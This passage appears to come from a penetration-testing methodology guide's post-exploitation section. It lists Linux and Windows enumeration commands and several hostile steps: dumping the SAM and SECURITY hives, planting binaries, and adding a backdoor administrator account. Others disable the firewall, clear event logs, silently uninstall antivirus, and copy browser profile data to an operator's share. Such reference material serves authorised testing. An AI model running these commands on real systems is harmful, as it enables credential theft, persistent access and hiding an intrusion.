</ul>
<p>There are a number of files in the hooks directory that may contain
sensitive information depending on the environment.</p>
</div>
<div class="section" id="identify-custom-apps">
<h4>Identify custom apps<a class="headerlink" href="#identify-custom-apps" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="backups">
<h4>Backups<a class="headerlink" href="#backups" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Locally stored backup files</li>
<li>Central backup server</li>
<li>Remote backup solutions</li>
<li>Tape storage</li>
</ul>
</div>
</div>
<div class="section" id="business-impact-attacks">
<h3>Business impact attacks<a class="headerlink" href="#business-impact-attacks" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>What makes the biz money</li>
<li>Steal It</li>
</ul>
</div>
<div class="section" id="further-penetration-into-infrastructure">
<h3>Further penetration into infrastructure<a class="headerlink" href="#further-penetration-into-infrastructure" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Botnets</li>
</ul>
<div class="section" id="pivoting-inside">
<h4>Pivoting inside<a class="headerlink" href="#pivoting-inside" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Linux Commands</li>
</ul>
<p>&#8211;Show users that have used ssh to connect to this host. grep publickey
/var/log/secure*|awk &#8216;{print $9&#8221;\t&#8221;$11&#8221;\t&#8221;$NF}&#8217;|sort -u</p>
<p>user1 ::ffff:10.0.0.1 ssh2 user2 ::ffff:10.0.0.2 ssh2 user3
::ffff:10.0.0.3 ssh2</p>
<p>&#8211;Show users that have used sudo. grep sudo /var/log/secure*|awk -F:
&#8216;{print $4}&#8217;|sort -u</p>
<p>user1 root user2 user4</p>
<p>&#8211;Show users with active cron use. cat /var/log/cron* |awk &#8216;$6 !~
/Updated/ {print $6}&#8217;|tr -d :math:<a href="#id53"><span class="problematic" id="id54">``</span></a>|sort -u</p>
<p>root user5 user1 user2</p>
<p>&#8211;Look at a users password settings. passwd -S user</p>
<ol class="arabic simple">
<li>passwd -S appuser</li>
</ol>
<p>Password locked.</p>
<ol class="arabic simple">
<li>passwd -S root</li>
</ol>
<p>Password set, MD5 crypt.</p>
<ol class="arabic simple">
<li>passwd -S bin</li>
</ol>
<p>Alternate authentication scheme in use.</p>
<p>&#8211;Users that have connected and from where. for i in $(ls
/var/log/wtmp*);do last -adf ${i}|awk &#8216;$1 !~ /wtmp/ {print
$1,$NF}&#8217;|sort -u; done</p>
<p>user1 testhost.example.com root testhost2.example.com user2
prodhost.example.com</p>
<p>&#8211;Who is logged in right now and from where. $ who -Hu NAME LINE TIME
IDLE PID COMMENT user1 pts/0 Jun 2 10:39 . 28001 (testhost.example.com)</p>
<p>&#8211;Pull IPv4 hosts from /etc/hosts, drop commented entries and localhost.
egrep -v &#8220;^[ \t]*#|^[ \t]*$|localhost&#8221; /etc/hosts 10.0.0.1
testhost.example.com testhost 10.0.0.2 testhost2.example.com testhost2
10.0.0.3 testhost3.example.com testhost3</p>
<p>&#8211;Pull commented IPv4 hosts from /etc/hosts egrep &#8220;^[ \t]*#+[
\t]*([0-9]{1,3}\.){3}[0-9]{1,3}&#8221; /etc/hosts</p>
<ol class="arabic simple">
<li>10.0.0.4 testhost4.example.com testhost4</li>
</ol>
<p>&#8211;Pull IPv6 hosts from /etc/hosts egrep
&#8220;(([:xdigit:]{0,4})\:?\:{1}){0,7}\:?\:{1}([:xdigit:]{0,4})?&#8221;
/etc/hosts</p>
<blockquote>
<div>1 loopback localhost # loopback (lo0) name/address
1FFF ipv6test.example.com ipv6test</div></blockquote>
<p>&#8211;Pull hostnames from known_hosts files for any user home you have
access to read. for i in $(awk -F: &#8216;{print $6}&#8217; /etc/passwd|sort -u);
do awk &#8216;{print $1}&#8217; ${i}/.ssh/known_hosts 2&gt; /dev/null;done|tr &#8216;,&#8217;
&#8216;\n&#8217;|sort -u testhost testhost3 testhost4 ipv6test prodhost</p>
<p>&#8211;Show private keys and if they are encrypted for i in $(grep &#8220;PRIVATE&#8221;
*|egrep -v &#8220;END&#8221;|awk -F: &#8216;{print $1}&#8217;); do print ${i};grep ENCRYPTED
${i};echo;done id_dsa</p>
<p>id_dsap Proc-Type: 4,ENCRYPTED</p>
<p>id_rsa32k Proc-Type: 4,ENCRYPTED</p>
<p>id_rsa512</p>
<p>id_rsa512p Proc-Type: 4,ENCRYPTED</p>
<p>&#8211;Look at the public keys and pull their type. Numerical types are SSH
protocol 1. for i in $(ls *.pub);do print ${i};awk &#8216;{print $1}&#8217;
${i};echo;done id_dsa.pub ssh-dss</p>
<p>id_dsap.pub ssh-dss</p>
<p>id_rsa16k.pub ssh-rsa</p>
<p>id_rsadef.pub ssh-rsa</p>
<p>identity2048.pub 2048</p>
<p>identity768p.pub 768</p>
<p>identity864.pub 864</p>
<ul class="simple">
<li>Windows Commands</li>
<li>Token Stealing and Reuse</li>
<li>Password Cracking</li>
<li>Wifi connections to other devices</li>
<li>Password Reuse</li>
<li>Keyloggers</li>
<li>User enumeration</li>
<li>From Windows DC or from individual machines</li>
<li>Linux passwd file</li>
<li>MSSQL Windows Auth users</li>
</ul>
<div class="section" id="history-and-logs">
<h5>History and Logs<a class="headerlink" href="#history-and-logs" title="Permalink to this headline">¶</a></h5>
<table border="1" class="docutils">
<colgroup>
<col width="7%" />
<col width="93%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">command</th>
<th class="head">use</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>date</td>
<td>Display date and time</td>
</tr>
<tr class="row-odd"><td>df</td>
<td>Display disk free space</td>
</tr>
<tr class="row-even"><td>iostat</td>
<td>Kernel I/O statistics</td>
</tr>
<tr class="row-odd"><td>netstat</td>
<td>Network status and throughput</td>
</tr>
<tr class="row-even"><td>lsof</td>
<td>List of open files</td>
</tr>
<tr class="row-odd"><td>ps</td>
<td>Process information</td>
</tr>
<tr class="row-even"><td>top</td>
<td>Display and update sorted process information</td>
</tr>
<tr class="row-odd"><td>who</td>
<td>Display who is on the system Check ssh known hosts file Log files to see who connects to the server</td>
</tr>
</tbody>
</table>
<p>Linux</p>
<p>.bash_history and other shell history files syslog</p>
<p>MySQL</p>
<ul class="simple">
<li>MySQL History</li>
<li>syslog</li>
</ul>
<p>Windows</p>
<ul class="simple">
<li>Event Logs</li>
<li>Recent opened files</li>
<li>Browsers</li>
<li>Favorites</li>
<li>stored passwords</li>
<li>stored cookies</li>
<li>browsing history</li>
<li>browser cache files</li>
<li>syslog</li>
</ul>
</div>
</div>
<div class="section" id="cleanup">
<h4>Cleanup<a class="headerlink" href="#cleanup" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Ensure documented steps of exploitation</li>
<li>Ensure proper cleanup</li>
<li>Remove Test Data</li>
<li>Leave no trace</li>
<li>Proper archiving and encryption of evidence to be handed back to
customer</li>
<li>Restore database from backup where necessary</li>
</ul>
</div>
</div>
<div class="section" id="persistence">
<h3>Persistence<a class="headerlink" href="#persistence" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ol class="arabic simple">
<li>Autostart Malware</li>
<li>Reverse Connections</li>
<li>Rootkits</li>
</ol>
<ul class="simple">
<li>User Mode</li>
<li>Kernel Based</li>
</ul>
<ol class="arabic simple" start="4">
<li>C&amp;C medium (http, dns, tcp, icmp)</li>
<li>Backdoors</li>
<li>Implants</li>
<li>VPN with credentials</li>
</ol>
</div>
</div>
<div class="section" id="post-exploitation">
<h2>Post Exploitation<a class="headerlink" href="#post-exploitation" title="Permalink to this headline">¶</a></h2>
<p>Post-exploitation activities are those that are conducted once a system
as been compromised. These activities vary based upon the type of
operating system. They can very from running simple &#8220;whoami&#8221; to
enumerating local accounts.</p>
<div class="section" id="windows-post-exploitation">
<h3>Windows Post Exploitation<a class="headerlink" href="#windows-post-exploitation" title="Permalink to this headline">¶</a></h3>
<div class="section" id="blind-files">
<h4>Blind Files<a class="headerlink" href="#blind-files" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line">(Things to pull when all you can do is to blindly read) LFI/Directory
traversal(s). Files that will have the same name across networks /
Windows domains / systems.</div>
<div class="line">{| ! align=&#8221;left&#8221;| File ! Expected Contents / Description |-
|<code class="docutils literal"><span class="pre">%SYSTEMDRIVE%\boot.ini</span></code> |A file that can be counted on to be
on virtually every windows host. Helps with confirmation that a read
is happening. |- |<code class="docutils literal"><span class="pre">%WINDIR%\win.ini</span></code> |This is another file to
look for if boot.ini isn’t there or coming back, which is some times
the case. |- |<code class="docutils literal"><span class="pre">%SYSTEMROOT%\repair\SAM</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">%SYSTEMROOT%\System32\config\RegBack\SAM</span></code> |It stores users&#8217;
passwords in a hashed format (in LM hash and NTLM hash). |-
|<code class="docutils literal"><span class="pre">%SYSTEMROOT%\repair\system</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">%SYSTEMROOT%\System32\config\RegBack\system</span></code> | |}</div>
</div>
</div>
<div class="section" id="non-interactive-command-execution">
<h4>Non Interactive Command Execution<a class="headerlink" href="#non-interactive-command-execution" title="Permalink to this headline">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="system">
<h4>System<a class="headerlink" href="#system" title="Permalink to this headline">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="34%" />
<col width="66%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Command</th>
<th class="head">Expected Output or Description</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>&nbsp;</td>
<td>Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">whoami</span> <span class="pre">/all</span></code></td>
<td>Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">set</span></code></td>
<td>Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">fsutil</span> <span class="pre">fsinfo</span> <span class="pre">drives</span></code></td>
<td>Must be an administrator to run this, but it lists the current drives on the system.</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">&lt;nowiki&gt;reg</span> <span class="pre">query</span> <span class="pre">HKLM</span> <span class="pre">/s</span> <span class="pre">/d</span> <span class="pre">/f</span> <span class="pre">&quot;C:\*</span> <span class="pre">*.exe&quot;</span> <span class="pre">|</span> <span class="pre">find</span> <span class="pre">/I</span> <span class="pre">&quot;C:\&quot;</span> <span class="pre">|</span> <span class="pre">find</span> <span class="pre">/V</span> <span class="pre">&quot;&quot;&quot;&quot;&lt;/nowiki&gt;</span></code></td>
<td>Locates insecurely registered executables within the system registry on Windows 7.</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="networking-ipconfig-netstat-net">
<h4>Networking (ipconfig, netstat, net)<a class="headerlink" href="#networking-ipconfig-netstat-net" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="http://www.securityaegis.com/ntsd-backdoor/">http://www.securityaegis.com/ntsd-backdoor/</a></p>
</div>
<div class="section" id="configs">
<h4>Configs<a class="headerlink" href="#configs" title="Permalink to this headline">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="32%" />
<col width="68%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">align=left&#8221;|Command</th>
<th class="head">Expected Output or Description</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal"><span class="pre">gpresult</span> <span class="pre">/z</span></code></td>
<td>Extremely verbose output of GPO (Group policy) settings as applied to the current system and user</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">sc</span> <span class="pre">qc</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">sc</span> <span class="pre">query</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">sc</span> <span class="pre">queryex</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">type</span> <span class="pre">%WINDIR%\System32\drivers\etc\hosts</span></code></td>
<td>Print the contents of the Windows hosts file</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">dir</span> <span class="pre">%PROGRAMFILES%</span></code></td>
<td>Prints a directory listing of the Program Files directory.</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">echo</span> <span class="pre">%COMSPEC%</span></code></td>
<td>Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure.</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="finding-important-files">
<h4>Finding Important Files<a class="headerlink" href="#finding-important-files" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="files-to-pull-if-possible">
<h4>Files To Pull (if possible)<a class="headerlink" href="#files-to-pull-if-possible" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="remote-system-access">
<h4>Remote System Access<a class="headerlink" href="#remote-system-access" title="Permalink to this headline">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="39%" />
<col width="61%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">align=left&#8221;|Command</th>
<th class="head">Description / Reason</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">share</span> <span class="pre">\\computername</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">tasklist</span> <span class="pre">/V</span> <span class="pre">/S</span> <span class="pre">computername</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">qwinsta</span> <span class="pre">/SERVER:computername</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">qprocess</span> <span class="pre">/SERVER:computername</span> <span class="pre">*</span></code></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">use</span> <span class="pre">\\computername</span></code></td>
<td>This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">use</span> <span class="pre">\\computername</span> <span class="pre">/user:DOMAIN\username</span> <span class="pre">password</span></code></td>
<td><p class="first">Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</p>
<p class="last">This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.</p>
</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">reg</span> <span class="pre">add</span> <span class="pre">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span> <span class="pre">Server&quot;</span> <span class="pre">/v</span> <span class="pre">fDenyTSConnections</span> <span class="pre">/t</span> <span class="pre">REG_DWORD</span> <span class="pre">/d</span> <span class="pre">0</span> <span class="pre">/f</span></code></td>
<td>Enable remote desktop.</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">reg</span> <span class="pre">add</span> <span class="pre">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span> <span class="pre">Server&quot;</span> <span class="pre">/v</span> <span class="pre">fAllowToGetHelp</span> <span class="pre">/t</span> <span class="pre">REG_DWORD</span> <span class="pre">/d</span> <span class="pre">1</span> <span class="pre">/f</span></code></td>
<td>Enable remote assistance</td>
</tr>
<tr class="row-even"><td><a href="#id55"><span class="problematic" id="id56">``</span></a>net time \computername ``</td>
<td>Shows the time of target computer)</td>
</tr>
<tr class="row-odd"><td><a href="#id57"><span class="problematic" id="id58">``</span></a>dir \computernameshare_or_admin_share  ``</td>
<td>dir list a remote directory</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">tasklist</span> <span class="pre">/V</span> <span class="pre">/S</span> <span class="pre">computername</span></code></td>
<td>Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="auto-start-directories">
<h4>Auto-Start Directories<a class="headerlink" href="#auto-start-directories" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line"><a href="#id59"><span class="problematic" id="id60">``</span></a>ver `` Returns kernel version - like uname on *nix)</div>
<div class="line">{| ! align=left&#8221;|Version !Location |- |Windows NT 6.1, 6.0
|%SystemDrive%\ProgramData\Microsoft\Windows\Start
Menu\Programs\Startup\ |- |Windows NT 5.2, 5.1, 5,0
|%SystemDrive%\Documents And Settings\All Users\Start
Menu\Programs\StartUp\ |- |Windows 9x
|%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\ |- |Windows
NT 4.0, 3.51, 3.50 |%SystemDrive%\WINNT\Profiles\All Users\Start
Menu\Programs\StartUp\ |}</div>
</div>
</div>
<div class="section" id="binary-planting">
<h4>Binary Planting<a class="headerlink" href="#binary-planting" title="Permalink to this headline">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="16%" />
<col width="84%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">align=left&#8221;|Location / File name</th>
<th class="head">Reason / Description</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal"><span class="pre">msiexec.exe</span></code></td>
<td>Idea taken from here: <a class="reference external" href="http://goo.gl/E3LTa">http://goo.gl/E3LTa</a> - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path, you get code execution.</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">%SystemRoot%\System32\wbem\mof\</span></code></td>
<td>Taken from stuxnet: <a class="reference external" href="http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf">http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf</a> Look for Print spooler vuln</td>
</tr>
</tbody>
</table>
<ul class="simple">
<li>WMI<ul>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">bios</span></code></li>
<li><a href="#id61"><span class="problematic" id="id62">``</span></a>wmic ``</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">qfe</span> <span class="pre">get</span> <span class="pre">hotfixid</span></code><ul>
<li>This gets patches IDs</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">startup</span></code></li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">service</span></code></li>
<li><a href="#id63"><span class="problematic" id="id64">``</span></a>wmic process ``<ul>
<li>Get caption,executablepath,commandline</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">process</span> <span class="pre">call</span> <span class="pre">create</span> <span class="pre">“process_name”</span></code><ul>
<li>Executes a program</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">process</span> <span class="pre">where</span> <span class="pre">name=”process_name”</span> <span class="pre">call</span> <span class="pre">terminate</span></code><ul>
<li>Terminates program</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">logicaldisk</span> <span class="pre">where</span> <span class="pre">drivetype=3</span> <span class="pre">get</span> <span class="pre">name,</span> <span class="pre">freespace,</span> <span class="pre">systemname,</span> <span class="pre">filesystem,</span> <span class="pre">size,</span> <span class="pre">volumeserialnumber</span></code><ul>
<li>Hard drive information</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">useraccount</span></code><ul>
<li>Usernames, sid, and various security related goodies</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">useraccount</span> <span class="pre">get</span> <span class="pre">/ALL</span></code></li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">share</span> <span class="pre">get</span> <span class="pre">/ALL</span></code><ul>
<li>You can use ? for gets help</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">startup</span> <span class="pre">list</span> <span class="pre">full</span></code><ul>
<li>This can be a huge list!!!</li>
</ul>
</li>
<li><code class="docutils literal"><span class="pre">wmic</span> <span class="pre">/node:&quot;hostname&quot;</span> <span class="pre">bios</span> <span class="pre">get</span> <span class="pre">serialnumber</span></code><ul>
<li>This can be great for finding warranty info about target</li>
</ul>
</li>
</ul>
</li>
<li>Reg Command exit<ul>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">save</span> <span class="pre">HKLM\Security</span> <span class="pre">security.hive</span></code> (Save security hive to a
file)</li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">save</span> <span class="pre">HKLM\System</span> <span class="pre">system.hive</span></code> (Save system hive to a file)</li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">save</span> <span class="pre">HKLM\SAM</span> <span class="pre">sam.hive</span></code> (Save sam to a file)</li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">add</span> <span class="pre">[\\TargetIPaddr\]</span> <span class="pre">[RegDomain][</span> <span class="pre">\Key</span> <span class="pre">]</span></code></li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">export</span> <span class="pre">[RegDomain]\[Key]</span> <span class="pre">[FileName]</span></code></li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">import</span> <span class="pre">[FileName</span> <span class="pre">]</span></code></li>
<li><code class="docutils literal"><span class="pre">reg</span> <span class="pre">query</span> <span class="pre">[\\TargetIPaddr\]</span> <span class="pre">[RegDomain]\[</span> <span class="pre">Key</span> <span class="pre">]</span> <span class="pre">/v</span> <span class="pre">[Valuename!]</span></code>
(you can to add /s for recurse all values )</li>
</ul>
</li>
</ul>
</div>
<div class="section" id="deleting-logs">
<h4>Deleting Logs<a class="headerlink" href="#deleting-logs" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line"><code class="docutils literal"><span class="pre">wevtutil</span> <span class="pre">el</span></code> (list logs)</div>
<div class="line"><code class="docutils literal"><span class="pre">wevtutil</span> <span class="pre">cl</span> <span class="pre">&lt;LogName&gt;</span></code> (Clear specific lowbadming)</div>
<div class="line"><code class="docutils literal"><span class="pre">del</span> <span class="pre">%WINDIR%\*.log</span> <span class="pre">/a</span> <span class="pre">/s</span> <span class="pre">/q</span> <span class="pre">/f</span></code></div>
</div>
</div>
<div class="section" id="uninstalling-software-antivirus-non-interactive">
<h4>Uninstalling Software “AntiVirus” (Non interactive)<a class="headerlink" href="#uninstalling-software-antivirus-non-interactive" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line"><a href="#id65"><span class="problematic" id="id66">``</span></a>wmic product get name /value <a href="#id67"><span class="problematic" id="id68">``</span></a>(this gets software names)</div>
<div class="line"><a href="#id69"><span class="problematic" id="id70">``</span></a>wmic product where name=&#8221;XXX&#8221; call uninstall /nointeractive <a href="#id71"><span class="problematic" id="id72">``</span></a>(this
uninstalls software)</div>
</div>
</div>
<div class="section" id="other">
<h4>Other<a class="headerlink" href="#other" title="Permalink to this headline">¶</a></h4>
<div class="line-block">
<div class="line"><code class="docutils literal"><span class="pre">pkgmgr</span> <span class="pre">usefull</span>&#160; <span class="pre">/iu</span> <span class="pre">:”Package”</span></code></div>
<div class="line"><a href="#id73"><span class="problematic" id="id74">``</span></a>pkgmgr usefull  /iu :”TelnetServer” <a href="#id75"><span class="problematic" id="id76">``</span></a>(Install Telnet Service ...)</div>
<div class="line"><a href="#id77"><span class="problematic" id="id78">``</span></a>pkgmgr /iu:”TelnetClient” <a href="#id79"><span class="problematic" id="id80">``</span></a>(Client )</div>
<div class="line"><a href="#id81"><span class="problematic" id="id82">``</span></a>rundll32.exe user32.dll, LockWorkStation <a href="#id83"><span class="problematic" id="id84">``</span></a>(locks the screen
-invasive-)</div>
<div class="line"><code class="docutils literal"><span class="pre">wscript.exe</span> <span class="pre">&lt;script</span> <span class="pre">js/vbs&gt;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">cscript.exe</span> <span class="pre">&lt;script</span> <span class="pre">js/vbs/c#&gt;</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">xcopy</span> <span class="pre">/C</span> <span class="pre">/S</span> <span class="pre">%appdata%\Mozilla\Firefox\Profiles\*.sqlite</span> <span class="pre">\\your_box\firefox_funstuff</span></code></div>
</div>
<div class="section" id="operating-specific">
<h5>Operating Specific<a class="headerlink" href="#operating-specific" title="Permalink to this headline">¶</a></h5>
<p>Win2k3</p>
<p><code class="docutils literal"><span class="pre">winpop</span> <span class="pre">stat</span> <span class="pre">domainname</span></code></p>
<p>Vista/7</p>
<div class="line-block">
<div class="line"><code class="docutils literal"><span class="pre">winstat</span> <span class="pre">features</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">wbadmin</span> <span class="pre">get</span> <span class="pre">status</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">wbadmin</span> <span class="pre">get</span> <span class="pre">items</span></code></div>
<div class="line"><code class="docutils literal"><span class="pre">gpresult</span> <span class="pre">/H</span> <span class="pre">gpols.htm</span></code><code class="docutils literal"><span class="pre">&lt;br&gt;</span>
<span class="pre">&lt;code&gt;bcdedit</span> <span class="pre">/export</span> <span class="pre">&lt;filename&gt;</span></code></div>
</div>
<p>Vista SP1/7/2008/2008R2 (x86 &amp; x64)</p>
<div class="line-block">
<div class="line">Enable/Disable Windows features with Deployment Image Servicing and
Management (DISM):</div>
</div>
<ul class="simple">
<li>Note* Works well after bypassuac + getsystem (requires system
privileges)</li>
<li>Note2* For Dism.exe to work on x64 systems, the long commands are
necessary</li>
</ul>
<div class="line-block">
<div class="line">To list features which can be enabled/disabled:</div>
<div class="line"><code class="docutils literal"><span class="pre">%windir%\System32\cmd.exe</span> <span class="pre">/c</span> <span class="pre">&quot;%SystemRoot%\system32\Dism.exe&quot;</span> <span class="pre">/online</span> <span class="pre">/get-features</span></code></div>
<div class="line-block">
<div class="line">To enable a feature (TFTP client for example):</div>
<div class="line"><code class="docutils literal"><span class="pre">%windir%\System32\cmd.exe</span> <span class="pre">/c</span> <span class="pre">&quot;%SystemRoot%\system32\Dism.exe&quot;</span> <span class="pre">/online</span> <span class="pre">/enable-feature</span> <span class="pre">/featurename:TFTP</span></code></div>
<div class="line">To disable a feature (again TFTP client):</div>
<div class="line"><code class="docutils literal"><span class="pre">%windir%\System32\cmd.exe</span> <span class="pre">/c</span> <span class="pre">&quot;%SystemRoot%\system32\Dism.exe&quot;</span> <span class="pre">/online</span> <span class="pre">/disable-feature</span> <span class="pre">/featurename:TFTP</span></code></div>
</div>
</div>
</div>
</div>
<div class="section" id="invasive-or-altering-commands">
<h4>Invasive or Altering Commands<a class="headerlink" href="#invasive-or-altering-commands" title="Permalink to this headline">¶</a></h4>
<p>These commands change things on the target and can lead to getting
detected</p>
<table border="1" class="docutils">
<colgroup>
<col width="26%" />
<col width="74%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">align=left&#8221;|Command</th>
<th class="head">Reason / Description</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">user</span> <span class="pre">hacker</span> <span class="pre">hacker</span> <span class="pre">/add</span></code></td>
<td>Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">localgroup</span> <span class="pre">administrators</span> <span class="pre">/add</span> <span class="pre">hacker</span></code> <code class="docutils literal"><span class="pre">net</span> <span class="pre">localgroup</span> <span class="pre">administrators</span> <span class="pre">hacker</span> <span class="pre">/add</span></code></td>
<td>Adds the new user ‘hacker’ to the local administrators group</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">share</span> <span class="pre">nothing$=C:\</span> <span class="pre">/grant:hacker,FULL</span> <span class="pre">/unlimited</span></code></td>
<td><p class="first">Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.</p>
<p class="last">One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind</p>
</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">net</span> <span class="pre">user</span> <span class="pre">username</span> <span class="pre">/active:yes</span> <span class="pre">/domain</span></code></td>
<td>Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">netsh</span> <span class="pre">firewall</span> <span class="pre">set</span> <span class="pre">opmode</span> <span class="pre">disable</span></code></td>
<td>Disables the local windows firewall</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">netsh</span> <span class="pre">firewall</span> <span class="pre">set</span> <span class="pre">opmode</span> <span class="pre">enable</span></code></td>
<td>Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="support-tools-binaries-links-usage">
